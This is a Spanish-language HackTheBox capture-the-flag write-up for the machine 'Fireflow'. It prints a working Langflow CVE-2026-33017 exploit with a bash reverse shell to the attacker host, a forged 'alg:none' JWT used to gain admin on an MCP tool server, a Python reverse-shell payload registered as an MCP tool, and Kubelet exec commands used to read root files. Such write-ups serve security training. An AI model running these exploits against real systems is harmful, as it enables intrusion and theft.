---
title: Fireflow
platform: HackTheBox
difficulty: Medium
os: Linux
releaseDate: 2026-06-23
date: 2026-11-01
publishedAt: 2026-11-02
tags: [LangFlow ,JWT ,JWT-Bypass ,MCP ,Kubernetes , Nodes/proxy, HTB, Medium, Linux]
image: ./thumb.png
imageShape: round
userRank: 3229
rating: 4.6
---

---
# Descripcion

Fireflow es una máquina Linux de dificultad media de Hack The Box que combina explotación web, vulnerabilidades en aplicaciones de inteligencia artificial y técnicas de escalada de privilegios en Kubernetes. La intrusión comienza mediante una vulnerabilidad de ejecución remota de código (RCE) en Langflow (CVE-2026-33017), que permite obtener acceso inicial al sistema. Posteriormente, se aprovechan credenciales expuestas y una configuración insegura de JWT en un servidor MCP para conseguir ejecución de código dentro de un contenedor. Finalmente, mediante una mala configuración de los permisos RBAC de Kubernetes y el acceso al servicio Kubelet, se consigue escapar del contenedor y obtener privilegios de root.

---

# Reconocimiento

## Nmap

> Comenzamos con un escaneo completo de puertos para identificar todos los servicios expuestos en la máquina objetivo.

```bash
$ nmap -p- --open --min-rate 5000 -Pn -n -sS 10.129.26.137

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 05:01 +0200
Nmap scan report for 10.129.26.137
Host is up (0.046s latency).
Not shown: 62745 closed tcp ports (reset), 2788 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 12.60 seconds
```

> Solo tenemos dos puertos abiertos: SSH (22) y HTTPS (443). A continuación lanzamos un escaneo de versiones y scripts por defecto sobre ambos para obtener más contexto.

```bash
$ nmap -p22,443 -sC -sV 10.129.26.137

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 05:02 +0200
Nmap scan report for fireflow.htb (10.129.26.137)
Host is up (0.086s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp open  ssl/http nginx
|_http-title: FireFlow \xE2\x80\x94 Task Force Nightfall
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.98 seconds
```

## Web

> Utilizamos `whatweb` para identificar las tecnologías que corren detrás del servicio HTTPS.

```bash
whatweb https://fireflow.htb
```

![Pasted-image-20261031214959.png](./Images/Pasted-image-20261031214959.png)

> Nos devuelve un posible `subdominio`, así que vamos a añadirlo a nuestro `/etc/hosts`.

> Accedemos a la web para inspeccionar su contenido.

- Web

![Pasted-image-20261031215009.png](./Images/Pasted-image-20261031215009.png)

![Pasted-image-20261031215014.png](./Images/Pasted-image-20261031215014.png)

> Explorando la página encontramos que podemos abrir un agente para conversar con él. Esto nos redirige al dominio `flow.fireflow.htb`, así que vamos directamente al agente.

![Pasted-image-20261031215019.png](./Images/Pasted-image-20261031215019.png)

> Intentamos interactuar con él, pero nos indica que aún está en desarrollo y no se puede utilizar todavía. Abajo a la izquierda podemos ver que está creado con `Langflow`.

> Buscando información sobre `Langflow` encontramos un `endpoint` que nos muestra su versión:

```
https://docs.langflow.org/api-reference-api-examples#api-versions
```

> El endpoint es `api/v1/version`.

![Pasted-image-20261031215032.png](./Images/Pasted-image-20261031215032.png)

> Está utilizando la versión `1.8.2` de `Langflow`. Buscando encontramos que es vulnerable a `RCE` con CVE `CVE-2026-33017`.Damos con un `POC` para obtener una shell.

# Shell como www-data

## CVE-2026-33017

> [!NOTE]
> CVE-2026-33017
> Es una vulnerabilidad crítica de Ejecución Remota de Código (RCE) no autenticada en Langflow, una plataforma de código abierto para construir flujos de trabajo de IA. La falla reside en el endpoint /api/v1/build_public_tmp/{flow_id}/flow, que permite a los atacantes inyectar código Python arbitrario que se ejecuta directamente mediante la función exec() sin ningún tipo de sandboxing o validación adecuada.

```

```

> Pero para que funcione debemos editar un par de cosas del script: hay que añadir un parámetro a las peticiones, ya que al ser `https` con un certificado autofirmado hay que especificar que se salte la verificación.

```python
import argparse
import sys
import threading
import uuid
import socket
import time
import base64
import requests

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return "127.0.0.1"

def start_listener(lport):
    print(f"[*] Listening on 0.0.0.0:{lport}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', lport))
            s.listen(1)
            conn, addr = s.accept()
            print(f"\n[!] SHELL ESTABLISHED FROM {addr[0]}:{addr[1]}\n")
            
            def pipe_data(src, dst):
                while True:
                    try:
                        d = src.recv(4096)
                        if not d: break
                        dst.write(d.decode(errors='replace'))
                        dst.flush()
                    except: break

            threading.Thread(target=pipe_data, args=(conn, sys.stdout), daemon=True).start()
            try:
                while True:
                    cmd = sys.stdin.readline()
                    if not cmd: break
                    conn.sendall(cmd.encode())
            except KeyboardInterrupt: pass
    except Exception as e: print(f"[-] Listener Error: {e}")

def build_exploit_payload(command: str) -> dict:
    malicious_code = f"""\
from langflow.custom import Component
from langflow.io import Output
_r = __import__('os').system({repr(command)})
class ExploitComponent(Component):
    display_name = "ExploitComponent"
    outputs = [Output(display_name="Result", name="output", method="run")]
    def run(self) -> str: return "ok"
"""
    node_id = str(uuid.uuid4())
    return {
        "data": {
            "nodes": [
                {
                    "id": node_id,
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "type": "CustomComponent",
                        "id": node_id,
                        "node": {
                            "template": {
                                "_type": "CustomComponent",
                                "code": {
                                    "value": malicious_code,
                                    "type": "code",
                                    "required": True,
                                    "show": True,
                                    "name": "code",
                                    "dynamic": False,
                                    "list": False,
                                    "multiline": True,
                                },
                            },
                            "description": "poc",
                            "display_name": "ExploitComponent",
                            "custom_fields": {},
                            "output_types": ["str"],
                            "base_classes": ["str"],
                            "outputs": [{"display_name": "Result", "name": "output", "method": "run", "selected": "str", "types": ["str"], "value": "__UNDEFINED__"}],
                        },
                    },
                }
            ],
            "edges": [],
            "viewport": {"x": 0, "y": 0, "zoom": 1},
        }
    }

def send_exploit(base_url, flow_id, command, timeout):
    payload = build_exploit_payload(command)
    endpoint = f"{base_url}/api/v1/build_public_tmp/{flow_id}/flow"
    
    try:
        resp = requests.post(
            endpoint, 
            json=payload, 
            cookies={"client_id": str(uuid.uuid4())}, 
            timeout=timeout,
            verify=False
        )
        return resp.status_code in (200, 201)
    except: return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--flow-id", required=True)
    parser.add_argument("--lhost", default=get_local_ip())
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    threading.Thread(target=start_listener, args=(args.lport,), daemon=True).start()
    time.sleep(1)

    shell_cmd = f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"
    cmd = f"echo {base64.b64encode(shell_cmd.encode()).decode()} | base64 -d | bash"

    base_url = args.url.rstrip("/")
    
    if send_exploit(base_url, args.flow_id, cmd, args.timeout):
        print("[+] Exploit sent.")

    while True: time.sleep(1)

if __name__ == "__main__":
    main()
```

> Ahora ejecutamos el script con la siguiente configuración:

```bash
python3 test.py --url https://flow.fireflow.htb:443 --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 --lhost 10.10.14.119 --lport 7777
```

![Pasted-image-20261031215104.png](./Images/Pasted-image-20261031215104.png)

# Shell como nightfall

## Enumeracion

> Obtenemos una `bash` como el usuario web `www-data`. Ahora vamos a listar los usuarios con shell asignada y a revisar el contenido de `/home`.

```bash
cat /etc/passwd | grep "sh"
ls -la /home
```

![Pasted-image-20261031215109.png](./Images/Pasted-image-20261031215109.png)

> Solo hay un usuario llamado `nightfall`. Vamos a listar las variables de entorno del usuario `www-data` para buscar credenciales o información sensible.

```bash
$ env

SHELL=bash
LANGFLOW_LOG_LEVEL=warning
USER_AGENT=langflow
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
LANGFLOW_NEW_USER_IS_ACTIVE=False
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/tmp
LOGNAME=www-data
LANGFLOW_SUPERUSER=langflow
SYSTEMD_EXEC_PID=1517
LANGFLOW_CONFIG_DIR=/var/lib/langflow
HOME=/var/www
LANG=en_US.UTF-8
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/langflow.service/memory.pressure
INVOCATION_ID=a6702d4ce2b3448dbcb20dbcb061b02a
TERM=xterm
USER=www-data
LANGFLOW_AUTO_LOGIN=False
SHLVL=3
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
JOURNAL_STREAM=8:8970
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
_=/usr/bin/env
OLDPWD=/opt/langflow/venv/bin
```

> Encontramos una contraseña de usuario de `langflow`. Vamos a probar si es la contraseña del usuario `nightfall`.

```
user: nightfall
pass: n1ghtm4r3_b4_n1ghtf4ll
```

![Pasted-image-20261031215115.png](./Images/Pasted-image-20261031215115.png)

# Lectura archivos como root

## Enumeracion

> Obtenemos acceso al usuario `nightfall`. Listamos su directorio principal para ver qué archivos contiene.

```bash
ls -la
```

![Pasted-image-20261031215120.png](./Images/Pasted-image-20261031215120.png)

> Comprobamos la carpeta `.mcp`.

![Pasted-image-20261031215125.png](./Images/Pasted-image-20261031215125.png)

> Miramos el archivo `config.json`.

```json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

> Vamos a realizar un `curl` a la URL que vemos en el archivo para identificar el servicio y sus endpoints.

```bash
$ curl http://10.129.244.214:30080/api/v1/version | jq

{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": [
      "HS256",
      "none"
    ]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

## MCP

> Vemos la versión de la API y sus endpoints. Vamos a intentar autenticarnos con las credenciales del archivo.

```bash
$ curl -X POST http://10.129.244.214:30080/api/v1/auth -H "Content-Type: application/json" -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' | jq

{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}
```

> Conseguimos autenticarnos y nos devuelve un token `JWT`. Vamos a hacer una petición a `tools` con este token.

```bash
$ curl http://127.0.0.1:30080/api/v1/tools -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps" | jq

[
  {
    "name": "ping_host",
    "description": "Ping a target host 3 times and return ICMP output."
  },
  {
    "name": "get_metrics_summary",
    "description": "Return a summary of system memory and load average from /proc."
  },
  {
    "name": "list_running_tasks",
    "description": "List the top 20 running processes sorted by CPU usage."
  }
]
```

> Nos devuelve una lista de `tools` que podemos ejecutar.

- Intentamos realizar la petición con método `POST`

```bash
curl -X POST http://10.129.244.214:30080/api/v1/tools -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps" | jq

{
  "detail": "Admin role required"
}
```

> Para añadir una `tool` necesitamos permisos de administrador. Vamos a probar si utilizando un token `JWT` con `alg: none` nos permite saltar la verificación de firma y así obtener un rol de administrador. Lo primero es analizar el `JWT`; yo utilizo la web `https://www.jwt.io/`.

![Pasted-image-20261031215133.png](./Images/Pasted-image-20261031215133.png)

> Así se divide el `header` y el `payload` del código `JWT`. Vamos a crear el nuestro propio pero con el `alg: none` con los siguientes comandos.

- Creamos el `header`

```bash
$ echo -n '{"alg":"none","typ":"JWT"}' | base64

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
```

- Creamos el `payload`

```bash
$ echo -n '{"sub":"langflow-bot","role":"admin"}' | base64

eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ==
```

> Ahora debemos unirlos: primero el `header` y después el `payload`, quitando los `=` y añadiendo un punto al final, pero sin poner la parte de `signature`.

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

> Comprobemos si funciona.

```bash
$ curl -X POST http://10.129.244.214:30080/api/v1/tools -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." | jq

{
  "detail": [
    {
      "type": "missing",
      "loc": [
        "body"
      ],
      "msg": "Field required",
      "input": null
    }
  ]
}
```

> Funciona, obtenemos rol de administrador. Ahora vamos a enviar un cuerpo vacío para comprobar su respuesta.

```bash
$ curl -X POST http://10.129.244.214:30080/api/v1/tools -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." -d "{}" | jq

{
  "detail": [
    {
      "type": "missing",
      "loc": [
        "body",
        "name"
      ],
      "msg": "Field required",
      "input": {}
    },
    {
      "type": "missing",
      "loc": [
        "body",
        "description"
      ],
      "msg": "Field required",
      "input": {}
    },
    {
      "type": "missing",
      "loc": [
        "body",
        "code"
      ],
      "msg": "Field required",
      "input": {}
    }
  ]
}
```

> Nos pide que enviemos esos parámetros: `name`, `description` y `code`. Buscando información sobre `MCP`, encontramos que el campo `command` se ejecuta a través de `python`, así que para comprobar si podemos ejecutar comandos vamos a mandarnos un `ping` a nuestra máquina.

```bash
$ curl -X POST http://10.129.244.214:30080/api/v1/tools -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." -d '{"name":"pingg", "description":"ping", "code":"import os\nos.system(\"ping -c 1 10.10.14.119\")"}' | jq

{
  "status": "registered",
  "name": "pingg"
}
```

- Ponemos `tcpdump` a la escucha para verificar si llega el ICMP.

```bash
sudo tcpdump -i tun0 ICMP
```

- Ejecutamos la `tool` que acabamos de crear.

```bash
$ curl -X POST http://10.129.244.214:30080/mcp -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"pingg","arguments": {}}}' | jq

{
  "jsonrpc": "2.0",
  "id": null,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "PING 10.10.14.119 (10.10.14.119) 56(84) bytes of data.\n64 bytes from 10.10.14.119: icmp_seq=1 ttl=62 time=44.1 ms\n\n--- 10.10.14.119 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 44.057/44.057/44.057/0.000 ms\n"
      }
    ],
    "isError": false
  }
}

```

![Pasted-image-20261031215143.png](./Images/Pasted-image-20261031215143.png)

> Recibimos el `ping`, así que hemos obtenido `RCE` en el servidor `MCP`. Vamos a enviarnos una shell.

- Creamos una nueva `tool` con un reverse shell en Python.

```bash
$ curl -X POST http://127.0.0.1:30080/api/v1/tools -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." -d '{"name":"shell", "description":"shell", "code":"import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.15.234\",7777))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"}' | jq

{
  "status": "registered",
  "name": "shell"
}
```

- Nos ponemos a la escucha con `nc`.

```bash
nc -nvlp 7777
```

- Ejecutamos la `tool` para disparar la reverse shell.

```bash
$ curl -X POST http://127.0.0.1:30080/mcp -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"shell","arguments": {}}}' | jq
```

![Pasted-image-20261031215148.png](./Images/Pasted-image-20261031215148.png)

> Obtenemos una shell como el usuario `mcp`. Listando el `env` vemos que estamos dentro de un `Kubernetes` y que el `Host` del `Kubernetes` se encuentra en `10.43.0.1:443`.

```bash
$ env

SHELL=bash
KUBERNETES_SERVICE_PORT_HTTPS=443
PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
KUBERNETES_SERVICE_PORT=443
HOSTNAME=mcp-server-54464cb475-29ztf
PYTHON_VERSION=3.11.15
PWD=/app
MCP_SERVER_SERVICE_HOST=10.43.250.195
MCP_SERVER_SERVICE_PORT=8080
HOME=/home/mcp
MCP_SERVER_PORT_8080_TCP_PROTO=tcp
LANG=C.UTF-8
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
LS_COLORS=
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
MCP_SERVER_PORT_8080_TCP_PORT=8080
MCP_SERVER_PORT_8080_TCP_ADDR=10.43.250.195
TERM=xterm
SHLVL=1
MCP_SERVER_PORT=tcp://10.43.250.195:8080
KUBERNETES_PORT_443_TCP_PROTO=tcp
MCP_SERVER_SERVICE_PORT_HTTP=8080
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
MCP_SERVER_PORT_8080_TCP=tcp://10.43.250.195:8080
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

## Kubernete

> Sabiendo que estamos dentro de un `Kubernetes`, vamos a enumerarlo utilizando la herramienta `kdigger`.

> [!TIP]
> Nos pasamos la herramienta desde nuestra máquina abriendo un servidor web y descargándola en el `Kubernetes`.

> Una vez pasada la herramienta, nos encontramos con esto:

![Pasted-image-20261101012312.png](./Images/Pasted-image-20261101012312.png)

> En `Kubernetes`, `nodes/proxy` es un subrecurso de la API que permite acceder al proxy del API Server hacia un nodo del clúster.

> Es especialmente interesante desde el punto de vista del pentesting porque puede permitir interactuar con servicios internos del nodo, incluido el `Kubelet`.

> Si bajamos un poco más con `kdigger` encontramos lo siguiente:

![Pasted-image-20261101014204.png](./Images/Pasted-image-20261101014204.png)

> Un token y un certificado necesarios para interactuar con la API del `Kubernetes`. Guardamos el certificado en un archivo y el `TOKEN` en una variable de entorno.

> Buscando por internet encuentro los principales endpoints de la API:

| `Endpoints`                    | Descripción                            |
| ------------------------------ | -------------------------------------- |
| `/pods`                        | Lista todos los `pods` del nodo        |
| `/exec/<ns>/<pod>/<container>` | Ejecuta comandos en cualquier `pod`    |
| `/run/<ns>/<pod>/<container>`  | Ejecuta un comando, sin interactividad |
| `/configz`                     | Configuración de Kubernetes            |
| `/logs/`                       | Archivos de ficheros logs              |

## Enumeración de pods privilegiados

> Ahora vamos a interactuar con el `Kubernetes`. Este se encuentra fuera del `pod`, así que vamos a mandar estas peticiones con el usuario `nightfall`. Primero vamos a comprobar los `pods`: lanzamos una petición que nos devuelva si alguno de ellos se ejecuta como privilegiado y si tiene algún directorio montado.

```bash
curl -sk "https://127.0.0.1:10250/pods" \
-H "Authorization: Bearer $TOKEN" | python3 -c '
import sys,json

for p in json.load(sys.stdin)["items"]:
    s=p["spec"]
    m=p["metadata"]

    mounts={v["name"]:v["hostPath"]["path"]
            for v in s.get("volumes",[]) if "hostPath" in v}

    for c in s["containers"]:
        sec=c.get("securityContext") or {}
        issues=[]

        if sec.get("privileged"): issues.append("PRIVILEGED")
        if sec.get("runAsUser")==0: issues.append("ROOT")
        if s.get("hostNetwork"): issues.append("HOSTNETWORK")
        if s.get("hostPID"): issues.append("HOSTPID")

        for vm in c.get("volumeMounts",[]):
            if vm["name"] in mounts:
                mode="RO" if vm.get("readOnly") else "RW"
                issues.append("{} -> {} [{}]".format(
                    mounts[vm["name"]],vm["mountPath"],mode))

        if issues:
            print("\n[!] {}/{} ({})".format(
                m["namespace"],m["name"],c["name"]))
            for i in issues:
                print("  -",i)
'


[!] monitoring/prometheus-prometheus-node-exporter-nmntq (node-exporter)
  - PRIVILEGED
  - ROOT
  - HOSTNETWORK
  - HOSTPID
  - /proc -> /host/proc [RO]
  - /sys -> /host/sys [RO]
  - / -> /host/root [RO]
```

> El `pod` `prometheus-prometheus-node-exporter-nmntq` tiene privilegios como `root` y tiene montados `/proc`, `/sys` y `/`, con sus rutas. Al poder ejecutar comandos dentro de él, ser privilegiado y tener montada toda la raíz, podemos modificar los archivos del sistema como queramos.

## Websocket

> Para enviar comandos se utiliza el endpoint `/exec`, que debe usarse a través de `WebSocket`. Vamos a comprobar si la máquina víctima tiene `websocat` instalado.

![Pasted-image-20261101024810.png](./Images/Pasted-image-20261101024810.png)

> Lo tenemos instalado, así que vamos a realizar la petición. La base que encontré en la documentación es esta:

```bash
websocat -k \
  -H="Authorization: Bearer $TOKEN" \
  --protocol=v5.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/namespaces/default/pods?output=1&error=1&command=/bin/sh&command=-c&command=id"
```

> En la URL hay que sustituir el `namespace` (`default`) y `pods` por los que correspondan; en este caso, nuestro script anterior nos los deja en orden. Quedarían así:

```bash
websocat -k  \
  -H="Authorization: Bearer $TOKEN" \
  --protocol=v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=id"
```

![Pasted-image-20261101025541.png](./Images/Pasted-image-20261101025541.png)

> Obtenemos `RCE` dentro del `pod`. Como sabemos que la ruta donde se guarda `/` es `/host/root`, vamos a comprobarlo.

```bash
websocat -k  \
  -H="Authorization: Bearer $TOKEN" \
  --protocol=v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=ls+/host/root"
```

![Pasted-image-20261101030404.png](./Images/Pasted-image-20261101030404.png)

> Solo tenemos permisos de lectura, así que vamos a leer el archivo `/host/root/root/root.txt`.

```bash
websocat -k  \
  -H="Authorization: Bearer $TOKEN" \
  --protocol=v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=cat+/host/root/root/root.txt"
```

![Pasted-image-20261101031338.png](./Images/Pasted-image-20261101031338.png)